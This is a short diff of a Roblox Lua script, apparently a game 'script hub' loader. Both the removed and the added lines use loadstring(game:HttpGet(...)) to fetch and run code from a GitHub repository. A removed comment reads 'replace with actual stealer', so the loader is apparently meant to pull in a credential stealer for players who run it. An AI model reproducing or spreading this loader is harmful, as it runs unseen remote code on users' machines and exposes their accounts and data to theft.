@@ -1,10 +1,2 @@
-local function ui()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/notugotskilz/scripthub/refs/heads/main/farmpt2important'))() -- replace with actual stealer
-end
-local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/notugotskilz/scripthub/refs/heads/main/UpdatedLoading"))()
-
-end
-
-task.spawn(ui)
-task.spawn(loadui)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/notugotskilz/scripthub/refs/heads/main/farmpt2important'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/notugotskilz/scripthub/refs/heads/main/UpdatedLoading"))()
